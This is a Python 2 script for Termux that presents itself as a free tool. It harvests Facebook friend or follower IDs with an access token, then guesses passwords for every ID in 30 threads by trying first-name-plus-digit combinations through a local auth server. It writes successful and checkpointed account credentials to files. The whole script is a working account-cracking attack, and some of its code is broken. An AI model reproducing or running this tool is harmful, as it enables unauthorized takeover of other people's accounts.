# -*- coding: utf-8 -*-
#!/usr/bin/python2
#coding=utf-8
#originally written by Azmi
try:
	import os
	import sys
	import time
	import datetime
	import random
	import hashlib
	import re
	import threading
	import json
	import getpass
	import urllib
	import cookielib
	import requests
	import uuid
	import string
	from multiprocessing.pool import ThreadPool
	from requests.exceptions import ConnectionError
	from datetime import datetime
except Exception as modul:
	print(" \033[0;97m[\033[0;91m!\033[0;97m] %s installed yet"%(modul))
	os.system('echo -e "Please wait installing modul"|  pip2 install requests')
os.system("clear")
if not os.path.isfile("/data/data/com.termux/files/usr/bin/node"):
    os.system("apt update && apt install nodejs -y")
try:
    os.mkdir('/sdcard/ids')
except OSError:
    pass

from requests.exceptions import ConnectionError
s = requests.Session()
rgb = random.choice(['\x1b[0;91m', '\x1b[0;92m', '\x1b[0;93m', '\x1b[0;94m', '\x1b[0;95m', '\x1b[0;96m', '\x1b[0;97m', '\x1b[0m'])
ua = s.get("https://raw.githubusercontent.com/xzmi007/fast/xzee/.ua.txt").text.strip()

reload(sys)
sys.setdefaultencoding('utf8')
os.system('termux-setup-storage')
os.system('clear')

logo = """
\t\033[1;92m     █████  ███████ ███    ███ ██
\t\033[1;92m    ██   ██      ██ ████  ████ ██
\t\033[1;92m    ███████   ███   ██ ████ ██ ██
\t\033[1;92m    ██   ██ ██      ██  ██  ██ ██
\t\033[1;92m    ██   ██ ███████ ██      ██ ██
\n\n\t\t\x1b[1;97m   THIS IS FREE TOOL UA
     """

def reg():
    os.system('clear')
    print logo
    time.sleep(1)
    
    os.system('cd xzee && npm install')
    os.system('fuser -k 5000/tcp &')
    os.system('#')
    os.system('cd xzee && node index.js &')
    os.system('clear')
    time.sleep(3)
    login()


def login():
    os.system('clear')
    try:
        token = open('.login.txt', 'r').read()
        menu()
    except (KeyError, IOError):
        print logo
        print '\n\n\t\t\033[1;32mLogin With Token'
        token = raw_input('\n   Paste token here : ')
        sav = open('.login.txt', 'w')
        sav.write(token)
        sav.close()
        menu()


def menu():
    os.system('clear')
    try:
        token = open('.login.txt', 'r').read()
    except (KeyError, IOError):
        login()

    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token, headers={'user-agent': ua})
        q = json.loads(r.text)
        name = q['name']
    except KeyError:
        print logo
        print '\033[1;91m\n\n\tLogged in token has expired'
        os.system('rm -rf .login.txt')
        login()
    print '\n\n\t\t\033[1;32mLogin User : ' + name
    time.sleep(2)
    agent()

def agent():
	os.system('clear')
	print '\n\n\t\t\033[1;32mChecking User Agent'
	time.sleep(2)
	try:
		ua = open('.ua.txt', 'r').read()
		crack()
	except (KeyError, IOError):
		os.system('clear')
		print logo
		print '\n\n    Setthing user agent'
		print('\n\n\t\033[0;92m    Copy this link and go to Chrome Search \n\t\t \033[0;93m ⇊⇊⇊⇊⇊⇊⇊⇊⇊⇊⇊⇊⇊⇊⇊⇊⇊⇊⇊⇊⇊⇊⇊⇊⇊⇊⇊⇊⇊ \n\n\t\t\033[0;97mhttps://myuseragent.blogspot.com/')
		ua = raw_input('\n    \033[0;93m[+] Paste User Agent : ')
		save = open(".ua.txt","w")
		save.write(ua)
		save.close()
		print('\n\t\033[0;92m[✓] Successfully Setting User-Agent')
		time.sleep(1)
		crack()


def crack():
    global token
    os.system('clear')
    try:
        token = open('.login.txt', 'r').read()
    except IOError:
        print ''
        print '\tToken not found '
        time.sleep(1)
        login_choice()
    os.system('clear')
    print logo
    print '\033[1;92m\n\n [1] Change User Agent'
    print ' [2] Clone From Public'
    print ' [3] Clone From Followers'
    print ' [4] Clone From File'
    crack_select()


def crack_select():
    select = raw_input('\n  Choose : ')
    id = []
    oks = []
    cps = []
    if select == '1':
    	os.system('clear')
        print logo
        try:
        	print '\n\n    Setthing User Agent'
        	ua = raw_input('\n    \033[0;93m[+] Paste User Agent : ')
        	save = open(".ua.txt","w")
        	save.write(ua)
        	save.close()
        except KeyError:
        	print logo
        	print '\n\n\tTry Again'
        	os.system('rm -rf .ua.txt')
        	time.sleep(1)
        	agent()
        print('\n\t\033[0;92m[✓] Successfully Setting User-Agent')
        time.sleep(1)
        crack()


    if select == '2':
        os.system('clear')
        print logo
        print '\n\n\t \x1b[1;92m Example Digit: 123 1234 12345 786 '
        p1 = raw_input('\n\n Name + Digit: ')
        p2 = raw_input(' Name + Digit: ')
        p3 = raw_input(' Name + Digit: ')
        p4 = raw_input(' Name + Digit: ')
        idt = raw_input('\n\n\x1b[1;92m Input id: ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers={'user-agent': ua})
            q = json.loads(r.text)
            os.system('clear')
            print logo
            print '\n\n\n Cloning from: ' + q['name']
        except KeyError:
            print '\n\n   Invalid id link'
            raw_input('\n   Press enter to back')
            crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers={'user-agent': ua})
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif select == '3':
        os.system('clear')
        print logo
        print '\n\n\t \x1b[1;92m Example Digit: 123 1234 12345 786 '
        p1 = raw_input('\n\n Name + Digit: ')
        p2 = raw_input(' Name + Digit: ')
        p3 = raw_input(' Name + Digit: ')
        p4 = raw_input(' Name + Digit: ')
        idt = raw_input('\n\n\x1b[1;92m Input id: ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers={'user-agent': ua})
            q = json.loads(r.text)
            os.system('clear')
            print logo
            print '\n\n\n Cloning from: ' + q['name']
        except KeyError:
            print '\n\n   Invalid id link'
            raw_input('\n   Press enter to back')
            crack()
        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999', headers={'user-agent': ua})
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif select == '4':
    	os.system('clear')
        print logo
        print '\n\n\t \x1b[1;92m Example Digit: 123 1234 12345 786 '
        p1 = raw_input('\n\n Name + Digit: ')
        p2 = raw_input(' Name + Digit: ')
        p3 = raw_input(' Name + Digit: ')
        p4 = raw_input(' Name + Digit: ')
        os.system('clear')
        print logo
        try:
            idlist = raw_input('\n\n [+] File Name: ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
        except IOError:
            print '\n\n   [!] File Not Found.'
            raw_input('\n   Press Enter To Back. ')
            crack()
    else:
        print '\n\n\tSelect valid option'
        crack_select()
    print ' Total IDs : ' + str(len(id))
    print ' The Process has started'
    print ''
    print 47 * '-'
    print ''

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            pass1 = name.lower() + p1
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers={'user-agent': ua})
            q = json.loads(data)
            if 'loc' in q:
                print ' \x1b[1;32m[OK]  \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('successful.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print ' \x1b[1;93m[Azmi-5-DAYS] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('checkpoint.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower() + p2
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers={'user-agent': ua})
                q = json.loads(data)
                if 'loc' in q:
                    print ' \x1b[1;32m[OK]  \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('successful.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print ' \x1b[1;93m[Azmi-5-DAYS] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('checkpoint.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + p3
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers={'user-agent': ua})
                    q = json.loads(data)
                    if 'loc' in q:
                        print ' \x1b[1;32m[OK]  \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('successful.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print ' \x1b[1;93m[Azmi-5-DAYS] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        cp = open('checkpoint.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name.lower() + p4
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers={'user-agent': ua})
                        q = json.loads(data)
                        if 'loc' in q:
                            print ' \x1b[1;32m[OK]  \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('successful.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print ' \x1b[1;93m[Azmi-5-DAYS] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            cp = open('checkpoint.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print ' The process has completed'
    print ' Total Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
    print ''
    print 47 * '-'
    print ''
    raw_input(' Press enter to back')
    crack()


reg()
